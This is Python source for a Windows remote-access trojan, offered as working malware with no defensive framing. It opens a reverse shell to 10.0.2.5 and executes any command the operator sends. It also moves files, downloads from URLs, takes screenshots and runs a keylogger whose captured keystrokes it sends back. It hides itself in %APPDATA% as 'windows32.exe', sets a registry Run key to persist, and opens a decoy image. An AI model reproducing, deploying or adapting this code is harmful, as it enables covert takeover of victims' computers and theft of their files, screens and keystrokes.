#!usr/bin/python

import socket
import subprocess
import os
import shutil
import sys
import time
import requests
from mss import mss
import threading
import keylogger
import pynput.keyboard

def reliable_send(data):
        sock.send(data)

def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024).decode('utf-8')
                        return data
                except ValueError:
                        continue

def connection():
        while True:
                time.sleep(15)
                try:
                        sock.connect(("10.0.2.5", 54321))
                        shell()
                        sock.close()
                        break
                except:

                        connection()

def is_admin():
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
        except:
                admin = "[!!] User Privilages!"
        else:
                admin = "[+] Administrator Privilages!"

def screenshot() :
        with mss() as screenshots:
                screenshots.shot()

def download(url):
        get_response = requests.get(url)
        file_name = url.split("/")[-1]
        with open (file_name, "wb") as out_file:
                out_file.write(get_response.content)

def transfer(filename):
        SEPARATOR = "<SEPARATOR>"
        filesize = os.path.getsize(filename)
        sock.send(f"{filename}{SEPARATOR}{filesize}".encode())
        file = open(filename, "rb")
        send_data = file.read(1024)
        while send_data:
             sock.send(send_data)
             send_data = file.read(1024)

def receive():
                received = sock.recv(4096).decode(errors='ignore')
                filename, garbage = received.split("/////")
                filename = os.path.basename(filename)
                file = open(filename, "wb")
                recv_data = sock.recv(1024)
                while recv_data:
                     file.write(recv_data)
                     recv_data = sock.recv(1024)

def shell():
        while True:
                command=reliable_recv()
                if command == 'q':
                        continue
                elif command == 'exit':
                        break
                elif command[:7] == 'sendall':
                        subprocess.Popen(command[8:], shell=True)
                elif command == 'help':
                        help_options= b'''                                        download path --> Download A File From Target PC
                                        upload path   --> Upload a File To Target PC
                                        get URL       --> Download A File To Target PC From Any Website
                                        start path    --> Start A Program On Target PC
                                        screenshot    --> Take Screenshot Of target PC Monitor
                                        check         --> Check For Administrator Privilages
                                        keylog_start  --> Start The Keylogger
                                        keylog_dump   --> Dump The Keystrokes From Keylogger
                                        q             --> Hold The Connection
                                        exit          --> Exit The Connection '''
                        reliable_send(help_options)
                elif command[:2] == 'cd' and len(command) > 2:
                        try:
                                os.chdir(command[3:])
                                result1 = b'[+] Directory Changed!'
                                reliable_send(result1)
                        except:
                                result2 = b'[!!] Directory Not Changed!'
                                reliable_send(result2)
                                continue
                elif command[:8] == 'download':
                        transfer(command[9:])
                elif command[:6] == 'upload':
                        receive()
                elif command[:3] == 'get':
                        try:
                                download(command[4:])
                                result3 = b'[+] Downloaded file from specified url'
                                reliable_send(result3)
                        except:
                                result4 = b'[!!] Failed to download the file'
                                reliable_send(result4)
                elif command[:10] == 'screenshot':
                        try:
                                screenshot()
                                transfer("monitor-1.png")
                                os.remove("monitor-1.png")
                        except:
                                result5 = b'[!!] Failed to take screenshot'
                                reliable_send(result5)
                elif command[:5] == 'start':
                                try:
                                        subprocess.Popen(command[6:], shell=True)
                                        result6 = b'[+] Started'
                                        reliable_send(result6)
                                except:
                                        result7 = b'[!!] Failed To Start!'
                                        reliable_send(result7)
                elif command[:5] == 'check':
                                try:
                                        is_admin()
                                        reliable_send(admin)
                                except:
                                        reliable_send("Can't Perform The Check")
                elif command[:12] == 'keylog_start':
                        t1 = threading.Thread(target = keylogger.start)
                        t1.start()
                elif command[:11] == 'keylog_dump':
                        fn = open(keylogger_path, "r")
                        reliable_send(fn.read().encode())
                else:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        result=proc.stdout.read() + proc.stderr.read()
                        reliable_send(result)

keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Satyam /t REG_SZ /d "' + location + '"', shell=True)

        file_name = sys._MEIPASS + "\car.jpg"
        subprocess.Popen(file_name, shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
